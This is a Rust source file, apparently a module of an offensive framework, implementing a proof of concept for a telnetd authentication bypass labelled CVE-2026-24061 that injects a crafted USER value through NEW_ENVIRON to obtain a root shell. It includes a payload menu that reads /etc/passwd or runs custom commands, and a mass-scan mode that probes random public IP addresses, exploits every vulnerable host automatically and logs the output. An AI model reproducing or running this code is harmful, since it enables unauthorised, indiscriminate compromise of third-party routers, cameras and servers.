use anyhow::{Result};
use colored::*;
use rand::Rng;

use std::net::{IpAddr, Ipv4Addr};

use std::sync::Arc;
use std::sync::atomic::{AtomicUsize, Ordering};
use std::time::Duration;
use tokio::net::TcpStream;
use tokio::io::{AsyncReadExt, AsyncWriteExt, AsyncBufReadExt, BufReader as TokioBufReader};
use tokio::sync::Semaphore;
use tokio::sync::mpsc;
use tokio::fs::OpenOptions;
use chrono::Local;

use crate::utils::{normalize_target, prompt_default, prompt_port, prompt_yes_no};

const DEFAULT_TIMEOUT_SECS: u64 = 5;
const MASS_SCAN_CONCURRENCY: usize = 100;

// Common Telnet ports to scan in parallel per IP
const COMMON_TELNET_PORTS: &[u16] = &[23, 2323, 23023, 8080];

// Telnet constants
const IAC: u8 = 255;
const DONT: u8 = 254;
const DO: u8 = 253;
const WONT: u8 = 252;
const WILL: u8 = 251;
const SB: u8 = 250;
const SE: u8 = 240;

const OPT_TTYPE: u8 = 24;
const OPT_TSPEED: u8 = 32;
const OPT_NEW_ENVIRON: u8 = 39;
const OPT_ECHO: u8 = 1;
const OPT_SGA: u8 = 3;

// Bogon/Private/Reserved exclusion ranges
const EXCLUDED_RANGES: &[&str] = &[
    "10.0.0.0/8", "127.0.0.0/8", "172.16.0.0/12", "192.168.0.0/16",
"224.0.0.0/4", "240.0.0.0/4", "0.0.0.0/8",
"100.64.0.0/10", "169.254.0.0/16", "255.255.255.255/32",
"1.1.1.1/32", "1.0.0.1/32", "8.8.8.8/32", "8.8.4.4/32",
];

// Robust Prompt Detection (from telnet_bruteforce.rs)
const SHELL_PROMPTS: &[&str] = &[
    // Basic shell prompts
    "$", "#", ">", "~", "%", " # ", " ~# ", " /# ", " ~ # ", " / # ",

// Common login success / welcome messages (English + multilingual)
"last login", "welcome", "welcome to", "logged in",
"login successful", "authentication successful", "successfully authenticated",
"motd", "message of the day", "have a lot of fun",
"you have mail", "you have new mail",
"press any key", "continue", "enter command", "available commands", "type help",

// User/host prompts
"user@", "root@", "admin@", "ubuntu", "debian", "centos", "red hat", "fedora",
"freebsd", "openbsd", "[root@", "[admin@", "bash-", "sh-",
"root:~#", "root:/#", "root@(none):/#", "root@(none):~#",

// Network device prompts
"router>", "router#", "switch>", "switch#",
"cisco", "ios>", "ios#",

// Multilingual welcomes (existing + expanded)
"bienvenido", "conectado", "bienvenue", "connecté", "bem-vindo", "willkommen", "angemeldet",
"benvenuto", "connesso", "добро пожаловать", "подключен",
"欢迎", "已连接", "ようこそ", "接続されました",

// === Chinese IoT / IP camera / router specific (niche, exotic, from real device dumps) ===
// Extremely common in cheap Chinese IP cameras (HiSilicon, Xiongmai, GrainMedia, GoAhead-based, etc.)
"~ #", "/ #", "~#", "/#",
"built-in shell (ash)",
"enter 'help' for a list of built-in commands.",
"/bin/sh: can't access tty; job control turned off",
"busybox v",                      // partial, appears in many versions
"busybox built-in shell",

// Specific variants seen in Chinese camera dumps
"welcome to faraday",
"welcome to faraday busybox",
"faraday busybox",
"[root@gm]#", "root@gm",           // GrainMedia OEM devices
"[root@dvrdvs /]#",                // common DVR/NVR hostname variant
"dvrdvs#",

// HiSilicon / Xiongmai / generic embedded strings (chipset or SDK hints that appear in prompts/hostnames)
"hi3518", "hi3516", "hi3536", "hisilicon",
"xm#", "xiongmai#", "xmeye#",      // Xiongmai / XMEye cloud variants
"gm8136", "gm8135", "grainmedia",

// Chinese vendor router / ONT / gateway prompts & banners
"<huawei>", "[huawei]", "huawei>", "huawei#",
"welcome visiting huawei", "huawei home gateway", "huawei terminal",
"zte>", "zxa", "zxan#", "zxa10#",
"fiberhome>", "fiberhome#",
"tp-link>", "tp-link router",
"tenda>", "tenda technology",
"xiaoqiang#", "miwifi#", "xiaomi router",

// Expanded Chinese welcome / success messages (common in domestic-market firmware)
"欢迎使用", "欢迎登录", "欢迎访问", "欢迎光临", "欢迎来到",
"欢迎使用本系统", "欢迎使用该终端", "欢迎使用该设备",
"欢迎您", "欢迎您登录", "您已成功登录",
"登录成功", "成功登录", "认证成功", "成功认证", "认证通过",
"已登录", "连接成功", "已连接", "会话已建立",
"系统就绪", "终端就绪", "终端准备就绪",

// Niche small/exotic Chinese brands & OEM codes seen in cheap cameras/routers
"v380#", "v380 pro#", "yyp2p#",
"jovision#", "tiandy#", "uniview#",
"escam#", "besder#", "wanscam#", "vstarcam#",
"annke#", "sv3c#", "foscam#",
"comfast#", "wavlink#", "kuwfi#",

// Miscellaneous exotic embedded strings from Chinese IoT
"ipcamera login",                 // pre-login, but often seen in dumps
"ont#", "gpon#", "home gateway",
"copyright huawei technologies", "copyright (c) huawei",
"vrp", "versatile routing platform"
];

#[derive(Clone, Copy, Debug, PartialEq, Eq)]
enum ExploitMode {
    CheckOnly,
    ExecuteCommand,
}

#[derive(Clone, Debug)]
struct ExploitConfig {
    mode: ExploitMode,
    user: String,
    payload: String,
}

fn generate_random_public_ip(exclusions: &[ipnetwork::IpNetwork]) -> IpAddr {
    let mut rng = rand::rng();
    loop {
        let octets: [u8; 4] = rng.random();
        let ip = Ipv4Addr::from(octets);
        let ip_addr = IpAddr::V4(ip);
        if !exclusions.iter().any(|net| net.contains(ip_addr)) {
            return ip_addr;
        }
    }
}

fn display_banner() {
    println!(
        "{}",
        "╔═══════════════════════════════════════════════════════════╗".cyan()
    );
    println!(
        "{}",
        "║   GNU inetutils-telnetd Remote Authentication Bypass      ║".cyan()
    );
    println!(
        "{}",
        "║   CVE-2026-24061 - Auth Bypass via NEW_ENVIRON            ║".cyan()
    );
    println!(
        "{}",
        "║   PoC by IRIS C2 Team - Ported to Rust for rustsploit     ║".cyan()
    );
    println!(
        "{}",
        "╚═══════════════════════════════════════════════════════════╝".cyan()
    );
}

struct TelnetExploit {
    host: String,
    port: u16,
    user: String,
    payload: Option<String>,
    exploit_sent: bool,
    payload_sent: bool,
}

impl TelnetExploit {
    fn new(host: &str, port: u16, user: &str, payload: Option<String>) -> Self {
        Self {
            host: host.to_string(),
            port,
            user: user.to_string(),
            payload,
            exploit_sent: false,
            payload_sent: false,
        }
    }

    async fn handle_negotiation<W: AsyncWriteExt + Unpin>(&mut self, writer: &mut W, data: &[u8]) -> Result<Vec<u8>> {
        let mut output = Vec::new();
        let mut i = 0;

        while i < data.len() {
            if data[i] != IAC {
                output.push(data[i]);
                i += 1;
                continue;
            }

            i += 1;
            if i >= data.len() { break; }

            let cmd = data[i];
            i += 1;

            if cmd == IAC {
                output.push(255);
                continue;
            }

            if cmd == SB {
                let sb_opt = if i < data.len() { data[i] } else { 0 };
                let mut sb_data = Vec::new();
                i += 1;
                while i < data.len() - 1 {
                    if data[i] == IAC && data[i+1] == SE {
                        i += 2;
                        break;
                    }
                    sb_data.push(data[i]);
                    i += 1;
                }

                if sb_opt == OPT_TTYPE && !sb_data.is_empty() && sb_data[0] == 1 {
                    let mut payload = vec![IAC, SB, OPT_TTYPE, 0];
                    payload.extend_from_slice(b"xterm");
                    payload.extend_from_slice(&[IAC, SE]);
                    writer.write_all(&payload).await?;
                } else if sb_opt == OPT_TSPEED && !sb_data.is_empty() && sb_data[0] == 1 {
                    let mut payload = vec![IAC, SB, OPT_TSPEED, 0];
                    payload.extend_from_slice(b"38400,38400");
                    payload.extend_from_slice(&[IAC, SE]);
                    writer.write_all(&payload).await?;
                } else if sb_opt == OPT_NEW_ENVIRON && !sb_data.is_empty() && sb_data[0] == 1 {
                    if !self.exploit_sent {
                        self.send_exploit(writer).await?;
                    }
                }
                continue;
            }

            if cmd == DO || cmd == DONT || cmd == WILL || cmd == WONT {
                if i >= data.len() { break; }
                let opt = data[i];
                i += 1;

                match cmd {
                    DO => {
                        if opt == OPT_TTYPE || opt == OPT_TSPEED || opt == OPT_NEW_ENVIRON {
                            writer.write_all(&[IAC, WILL, opt]).await?;
                        } else {
                            writer.write_all(&[IAC, WONT, opt]).await?;
                        }
                    }
                    WILL => {
                        if opt == OPT_ECHO || opt == OPT_SGA {
                            writer.write_all(&[IAC, DO, opt]).await?;
                        } else {
                            writer.write_all(&[IAC, DONT, opt]).await?;
                        }
                    }
                    WONT => {
                        writer.write_all(&[IAC, DONT, opt]).await?;
                    }
                    DONT => {
                        writer.write_all(&[IAC, WONT, opt]).await?;
                    }
                    _ => {}
                }
            }
        }
        Ok(output)
    }

    async fn send_exploit<W: AsyncWriteExt + Unpin>(&mut self, writer: &mut W) -> Result<()> {
        let mut payload = vec![IAC, SB, OPT_NEW_ENVIRON, 0, 0];
        payload.extend_from_slice(b"USER");
        payload.push(1);
        payload.extend_from_slice(format!("-f {}", self.user).as_bytes());
        payload.extend_from_slice(&[IAC, SE]);
        writer.write_all(&payload).await?;
        self.exploit_sent = true;
        Ok(())
    }

    fn is_shell_prompt(&self, text: &str) -> bool {
        let lower = text.to_lowercase();
        // Check standard endings
        let trimmed = text.trim();
        if trimmed.ends_with('#') || trimmed.ends_with('$') || trimmed.ends_with('>') || trimmed.ends_with('%') {
            return true;
        }
        // Check comprehensive indicators
        for indicator in SHELL_PROMPTS {
            if lower.contains(indicator) {
                return true;
            }
        }
        false
    }

    pub async fn run_exploit(&mut self, timeout_secs: u64, interactive: bool) -> Result<String> {
        let addr = format!("{}:{}", self.host, self.port);
        let stream = tokio::time::timeout(Duration::from_secs(timeout_secs), TcpStream::connect(&addr)).await??;

        let (reader, mut writer) = stream.into_split();
        let mut reader = TokioBufReader::new(reader);
        let mut stdin = TokioBufReader::new(tokio::io::stdin());
        let mut stdout = tokio::io::stdout();

        let mut buf = [0u8; 4096];
        let mut line = String::new();
        let mut command_output = String::new();

        // Proactively send options to trigger negotiation (crucial for some servers)
        writer.write_all(&[IAC, WILL, OPT_NEW_ENVIRON, IAC, WILL, OPT_TTYPE, IAC, WILL, OPT_TSPEED]).await?;

        if interactive {
            println!("{}", format!("[+] Connected to {}", addr).green());
            println!("{}", "[*] Entering interactive mode. Commands will be sent to the remote shell.".cyan());
            println!("{}", "[*] The exploit will be sent automatically during telnet negotiation.".cyan());
        }

        loop {
            tokio::select! {
                res = reader.read(&mut buf) => {
                    let n = res?;
                    if n == 0 { break; }
                    let output = self.handle_negotiation(&mut writer, &buf[..n]).await?;
                    if !output.is_empty() {
                        let text = String::from_utf8_lossy(&output);
                        if interactive {
                            stdout.write_all(&output).await?;
                            stdout.flush().await?;
                        } else {
                            command_output.push_str(&text);
                        }

                        // If we have a payload and just connected/exploited, send it once we see a prompt
                        if let Some(cmd) = &self.payload {
                            if self.exploit_sent && !self.payload_sent {
                                if self.is_shell_prompt(&text) {
                                    writer.write_all(format!("{}\n", cmd).as_bytes()).await?;
                                    self.payload_sent = true;
                                }
                            }
                        }
                    }
                }
                res = stdin.read_line(&mut line), if interactive => {
                    let n = res?;
                    if n == 0 { break; }
                    writer.write_all(line.as_bytes()).await?;
                    line.clear();
                }
                _ = tokio::time::sleep(Duration::from_secs(5)), if !interactive && self.payload_sent => {
                    // Timeout after sending payload to capture output
                    break;
                }
            }
        }
        Ok(command_output)
    }
}

async fn quick_check(ip: &str, port: u16, _user: &str) -> bool {
    let addr = format!("{}:{}", ip, port);
    match tokio::time::timeout(Duration::from_secs(5), TcpStream::connect(&addr)).await {
        Ok(Ok(mut stream)) => {
            let mut buf = [0u8; 1024];
            let _ = stream.write_all(&[IAC, WILL, OPT_NEW_ENVIRON]).await;
            match tokio::time::timeout(Duration::from_secs(3), stream.read(&mut buf)).await {
                Ok(Ok(n)) if n > 0 => {
                    if n >= 3 {
                        for i in 0..n-2 {
                            if buf[i] == IAC && (buf[i+1] == DO || buf[i+1] == SB) && buf[i+2] == OPT_NEW_ENVIRON {
                                return true;
                            }
                        }
                    }
                }
                _ => {}
            }
            false
        }
        _ => false,
    }
}

fn prompt_exploit_config() -> Result<ExploitConfig> {
    println!("{}", "\n[Operation Mode]".bold().cyan());
    println!("  1. Just Vulnerability Check (Safe)");
    println!("  2. Execute Command Payload (Unsafe)");
    let choice = prompt_default("Select mode [1-2]", "1")?;

    let mode = if choice == "2" { ExploitMode::ExecuteCommand } else { ExploitMode::CheckOnly };

    let mut payload = String::new();
    if mode == ExploitMode::ExecuteCommand {
        println!("{}", "\n[Payload Menu]".bold().cyan());
        println!("  1. Basic Info (id; whoami; uname -a)");
        println!("  2. Read /etc/passwd");
        println!("  3. List Root Directory (ls -la /)");
        println!("  4. Custom Command");
        let p_choice = prompt_default("Select payload [1-4]", "1")?;

        payload = match p_choice.as_str() {
            "1" => "id; whoami; uname -a".to_string(),
            "2" => "cat /etc/passwd".to_string(),
            "3" => "ls -la /".to_string(),
            "4" => {
                print!("{}", "Enter custom command: ".green());
                std::io::Write::flush(&mut std::io::stdout())?;
                let mut input = String::new();
                std::io::stdin().read_line(&mut input)?;
                input.trim().to_string()
            }
            _ => "id; whoami; uname -a".to_string(),
        };
    }

    let user = prompt_default("Username to bypass as", "root")?;

    Ok(ExploitConfig { mode, user, payload })
}

async fn run_mass_scan(config: ExploitConfig) -> Result<()> {
    display_banner();
    println!("{}", "[*] Mass Scan Mode: 0.0.0.0/0".yellow().bold());
    println!("{}", format!("[*] Mode: {:?}", config.mode).cyan());
    if config.mode == ExploitMode::ExecuteCommand {
        println!("{}", format!("[*] Payload: {}", config.payload).cyan());
    }

    let use_exclusions = prompt_yes_no("[?] Exclude reserved/private ranges?", true)?;
    let mut exclusions = Vec::new();
    if use_exclusions {
        for cidr in EXCLUDED_RANGES {
            if let Ok(net) = cidr.parse::<ipnetwork::IpNetwork>() {
                exclusions.push(net);
            }
        }
    }
    let exclusions = Arc::new(exclusions);

    let outfile = prompt_default("[?] Output File", "telnet_exploit_hits.txt")?;
    let outfile = Arc::new(outfile);

    let threads = prompt_default("[?] Concurrency (IPs)", &MASS_SCAN_CONCURRENCY.to_string())?
    .parse::<usize>()
    .map_or(MASS_SCAN_CONCURRENCY, |v| if v > 0 { v } else { MASS_SCAN_CONCURRENCY });

    let semaphore = Arc::new(Semaphore::new(threads));
    let checked = Arc::new(AtomicUsize::new(0));
    let found = Arc::new(AtomicUsize::new(0));

    let (tx, mut rx) = mpsc::unbounded_channel::<String>();

    let outfile_clone = outfile.clone();
    tokio::spawn(async move {
        let file_result = OpenOptions::new()
        .create(true)
        .append(true)
        .open(&*outfile_clone)
        .await;

        let mut file = match file_result {
            Ok(f) => f,
            Err(e) => {
                eprintln!("[-] Failed to open output file: {}", e);
                return;
            }
        };

        while let Some(result) = rx.recv().await {
            let _ = file.write_all(result.as_bytes()).await;
        }
    });

    let c = checked.clone();
    let f = found.clone();
    tokio::spawn(async move {
        loop {
            tokio::time::sleep(Duration::from_secs(10)).await;
            println!("[*] Checked: {} | Found: {}", c.load(Ordering::Relaxed), f.load(Ordering::Relaxed));
        }
    });

    println!("{}", "[*] Starting mass scan... Press Ctrl+C to stop.".cyan());

    let config = Arc::new(config);

    loop {
        let permit = semaphore.clone().acquire_owned().await.map_err(|e| anyhow::anyhow!("Semaphore closed: {}", e))?;
        let exc = exclusions.clone();
        let chk = checked.clone();
        let fnd = found.clone();
        let tx = tx.clone();
        let cfg = config.clone();

        tokio::spawn(async move {
            let ip = generate_random_public_ip(&exc).to_string();

            // Scan common ports in parallel for this IP
            let mut port_tasks = Vec::new();
            for &port in COMMON_TELNET_PORTS {
                let ip_clone = ip.clone();
                let cfg_clone = cfg.clone();
                let tx_clone = tx.clone();
                let fnd_clone = fnd.clone();

                port_tasks.push(tokio::spawn(async move {
                    if quick_check(&ip_clone, port, &cfg_clone.user).await {
                        println!("{}", format!("[+] VULNERABLE: {}:{}", ip_clone, port).green().bold());
                        fnd_clone.fetch_add(1, Ordering::Relaxed);

                        let mut log_entry = format!("[{}] {}:{} - VULNERABLE\n", Local::now().format("%Y-%m-%d %H:%M:%S"), ip_clone, port);

                        if cfg_clone.mode == ExploitMode::ExecuteCommand {
                            let mut exploit = TelnetExploit::new(&ip_clone, port, &cfg_clone.user, Some(cfg_clone.payload.clone()));
                            if let Ok(output) = exploit.run_exploit(5, false).await {
                                log_entry.push_str(&format!("Payload: {}\nOutput:\n{}\n", cfg_clone.payload, output));
                            }
                        }

                        let _ = tx_clone.send(log_entry);
                    }
                }));
            }

            // Wait for all port checks for this IP to finish
            for task in port_tasks {
                let _ = task.await;
            }

            chk.fetch_add(1, Ordering::Relaxed);
            drop(permit);
        });
    }
}

pub async fn run(target: &str) -> Result<()> {
    if target == "0.0.0.0" || target == "0.0.0.0/0" || target == "random" || target.is_empty() {
        let config = prompt_exploit_config()?;
        run_mass_scan(config).await
    } else {
        display_banner();
        let normalized = match normalize_target(target) {
            Ok(t) => t,
            Err(_) => target.to_string(),
        };
        println!("{}", format!("[*] Target: {}", normalized).yellow());

        let config = prompt_exploit_config()?;

        if config.mode == ExploitMode::CheckOnly {
            println!("{}", "[*] Checking multiple ports in parallel...".cyan());
            let mut found_any = false;
            let mut tasks = Vec::new();

            for &port in COMMON_TELNET_PORTS {
                let target_clone = target.to_string();
                let user_clone = config.user.clone();
                tasks.push(tokio::spawn(async move {
                    if quick_check(&target_clone, port, &user_clone).await {
                        println!("{}", format!("[+] Port {} is VULNERABLE", port).green().bold());
                        true
                    } else {
                        false
                    }
                }));
            }

            for task in tasks {
                if let Ok(res) = task.await {
                    if res { found_any = true; }
                }
            }

            if !found_any {
                println!("{}", "[-] No common telnet ports were found VULNERABLE".red());
            }
        } else {
            let port = prompt_port("Explicit Telnet Port", 23)?;
            let mut exploit = TelnetExploit::new(target, port, &config.user, Some(config.payload.clone()));
            exploit.run_exploit(DEFAULT_TIMEOUT_SECS, true).await?;
        }
        Ok(())
    }
}
